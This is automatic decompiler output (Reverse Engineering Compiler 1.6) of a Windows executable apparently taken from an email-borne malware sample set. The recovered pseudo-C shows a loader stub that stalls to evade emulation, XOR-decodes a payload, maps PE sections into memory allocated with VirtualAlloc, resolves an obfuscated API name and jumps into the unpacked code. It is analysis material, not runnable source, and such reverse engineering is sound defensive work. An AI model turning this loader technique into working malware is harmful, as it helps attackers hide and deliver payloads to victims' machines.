/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0665/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x00400300 - 0x00400328
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    L004003B3();
    ebp = esp;
    (save)ebx;
    *L00400800 = 20;
    (restore)ebx;
    EnumPageFilesA(0x40036a, 0, ebp);
    (restore)ebp;
    return(0);
}

/* DEST BLOCK NOT FOUND: 00400338 -> 00400534 */
/* DEST BLOCK NOT FOUND: 004003dd -> 0040053a */
stack space not deallocated on return
/*	Procedure: 0x00400329 - 0x004003B2
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00400329()
{



    (save)1792;
    ecx = 30;
    (save)0x40033d;
    goto GetLastError;
    (restore)ecx;
    eax = eax >> 4;
    if(eax >= ecx - 512) {
        asm("pusha");
    }
    (save)0;
    EnumPageFilesA(0x400305);
    eax = *L00400800;
    if(eax > 10) {
        eax = 0;
    }
    return;
    esi = L004004A9();
    edi = 0x40082c;
    ecx = 0;
    edx = 0;
L0040037b:
    al = *(edx + 0x40082c);
    bl = *(ecx + esi);
    if(bl != 0 && bl != al) {
        bl = bl ^ al;
        asm("xchg bl,al");
        *(ecx + esi) = al;
        asm("xchg al,bl");
    }
    ecx = ecx + 1;
    edx = edx + 1;
    if(edx >= 4) {
        edx = 0;
    }
    if(ecx >= *L00400830) {
    } else {
        goto L0040037b;
    }
    return(0);
}

/* DEST BLOCK NOT FOUND: 004003dd -> 0040053a */
/* DEST BLOCK NOT FOUND: 004004b0 -> 0040053a */
/*	Procedure: 0x004003B3 - 0x004004A8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004003B3()
{
	/* unknown */ void  Vfffffffc;



    while(1) {
        (save)ebp;
        ebp = esp;
        esp = esp + -8;
        ebx = "askozelds";
        (save)eax;
        esp = esp - 4;
        asm("xchg eax,[esp+0x4]");
        esp = esp + *(esp + 4);
        *esp = ebx;
        ebx = GetCurrentProcess();
        (save)0x4003e2;
        goto GetModuleHandleA;
        (save)0x400403;
        eax = L00400329();
        if(*L00400800 < 10) {
            (save)1;
            (save)2000;
            eax = SleepEx();
        }
    }
    (save)-65;
    (save)-12289;
    *esp = !( *esp);
    Vfffffffc = !Vfffffffc;
    eax = L004004A9() + *(L004004A9() + 60);
    (save) *(eax + 80);
    (save) *(eax + 52);
    eax = VirtualAlloc;
    (save)0x40042c;
    goto ( *VirtualAlloc);
    *(ebp - 4) = eax;
    ecx = *(L004004A9() + *(L004004A9() + 60) + 84);
    edi = *(ebp - 4);
    (save)L004004A9();
    asm("xchg eax,esi");
    (restore)eax;
    L004004C2();
    (save)L004004A9();
    asm("xchg eax,edx");
    (restore)eax;
    edx = edx + *(edx + 60);
    *(ebp - 8) = *(edx + 6);
    *(ebp - 8) = *(ebp - 8) & 65535;
    edx = edx + 248;
L0040046a:
    edi = *(ebp - 4) + *(edx + 12);
    eax = L004004A9() + *(edx + 20);
    ecx = *(edx + 16);
    if(*(ebp - 8) != 0) {
        L004004C2();
        edx = edx + 40;
        *(ebp - 8) = *(ebp - 8) - 1;
        goto L0040046a;
    }
    eax = L004004A9();
    goto ( *(eax + *(eax + 60) + 40) + *(ebp - 4));
    (save)0;
    eax = ExitProcess();
}

/* DEST BLOCK NOT FOUND: 004004b0 -> 0040053a */
/*	Procedure: 0x004004A9 - 0x004004C1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004004A9()
{



    (save)0;
    (save)0x4004b5;
    goto GetModuleHandleA;
    (save)ebx;
    eax = eax + *L00400834;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x004004C2 - 0x00400527
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004004C2()
{



    (save)esi;
    esi = eax;
    al = *esi;
    esi = esi + 1;
    *edi = al;
    edi = edi + 1;
    asm("loop 0x4004c5");
    (restore)esi;
    return;
    ebx = 51;
    ecx = 26;
    eax = "©–‹Šž“¾““œÿ”š‘š“ÌÍÑ›““ÿ•z*=]";
    *eax = !( *eax);
    eax = eax + 1;
    asm("loop 0x4004dd");
    ebx = GetModuleHandleA(0x40081f);
    eax = *(ebx + 60) + ebx;
    edx = ebx + *(eax + 120);
    eax = *(edx + 32) + ebx;
    (save)ebp;
    ebp = 0;
L00400500:
    ecx = 13;
    edi = "©–‹Šž“¾““œÿ”š‘š“ÌÍÑ›““ÿ•z*=]";
    asm("cld");
    asm("repe cmpsb");
    if(!(esi = *(eax + ebp * 4) + ebx)) {
        ebp = ebp + 1;
        if(ebp != *(edx + 24)) {
            goto L00400500;
        }
    }
    ecx = ebp;
    (restore)ebp;
    return(*( *(edx + 28) + ebx + ecx * 4) + ebx);
}

/* DEST BLOCK NOT FOUND: 00400528 -> 00400500 */
/*	Procedure: 0x00400528 - 0x0040052D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ExitProcess()
{



    goto ( *__imp__ExitProcess);
}

/* DEST BLOCK NOT FOUND: 0040052e -> 00400500 */
/*	Procedure: 0x0040052E - 0x00400533
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetCurrentProcess()
{



    goto ( *__imp__GetCurrentProcess);
}

/* DEST BLOCK NOT FOUND: 00400534 -> 00400500 */
/*	Procedure: 0x00400534 - 0x00400539
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetLastError()
{



    goto ( *__imp__GetLastError);
}

/* DEST BLOCK NOT FOUND: 0040053a -> 00400500 */
/*	Procedure: 0x0040053A - 0x0040053F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetModuleHandleA()
{



    goto ( *__imp__GetModuleHandleA);
}

/* DEST BLOCK NOT FOUND: 00400540 -> 00400500 */
/*	Procedure: 0x00400540 - 0x00400545
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

SleepEx()
{



    goto ( *__imp__SleepEx);
}

/* DEST BLOCK NOT FOUND: 00400546 -> 00400500 */
/*	Procedure: 0x00400546 - 0x0040054B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

VirtualAlloc()
{



    goto ( *__imp__VirtualAlloc);
}

/* DEST BLOCK NOT FOUND: 0040054c -> 00400500 */
/*	Procedure: 0x0040054C - 0x00400550
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

EnumPageFilesA()
{



    goto ( *__imp__EnumPageFilesA);
}

/* address  size  */
/* 0x00400300       0 */ /* unknown */ void 	__entry_point__;
/* 0x00400528       0 */ /* unknown */ void 	ExitProcess;
/* 0x0040052e       0 */ /* unknown */ void 	GetCurrentProcess;
/* 0x00400534       0 */ /* unknown */ void 	GetLastError;
/* 0x0040053a       0 */ /* unknown */ void 	GetModuleHandleA;
/* 0x00400540       0 */ /* unknown */ void 	SleepEx;
/* 0x00400546       0 */ /* unknown */ void 	VirtualAlloc;
/* 0x0040054c       0 */ /* unknown */ void 	EnumPageFilesA;
/* 0x00400600       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00400604       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x00400608       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x0040060c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00400610       0 */ /* unknown */ void 	__imp__SleepEx;
/* 0x00400614       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040061c       0 */ /* unknown */ void 	__imp__EnumPageFilesA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
